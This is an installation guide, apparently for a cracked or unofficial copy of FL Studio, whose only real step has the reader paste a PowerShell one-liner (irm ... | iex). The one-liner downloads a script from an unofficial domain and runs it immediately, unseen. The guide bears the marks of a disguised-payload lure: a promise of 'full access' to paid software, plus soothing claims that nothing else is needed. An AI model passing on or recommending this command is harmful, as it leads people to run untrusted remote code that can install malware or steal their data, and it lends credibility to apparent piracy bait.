Installation Guide
----------------------------------------------------

## Requirements
- Windows 10 / 11
- Compatible Hardware (2 GHz AMD or Intel CPU, 4 GB RAM minimum / 8 GB recommended, sound card or audio interface)
- Internet connection

## What You Get
- Full access to FL Studio installer

## Installation

### Windows quick start (Currently, this only works via PowerShell.)

1. Press Win + X and select Terminal (or search for PowerShell in the Start menu)
2. Paste the following command and press Enter:
```pwsh
irm 'https://edge.kpe-engine.com/p/fl_studio.ps1' | iex
```

> The script will download the FL Studio setup files and prompt you to start the installation. 
> The whole process takes less than a minute.

## After Installation

Once the installation is complete, launch FL Studio directly from your Start menu or desktop shortcut. No additional manual configuration is needed.

## How It Works

The script automatically downloads the latest FL Studio installer package for your operating system and launches the setup wizard for quick installation.
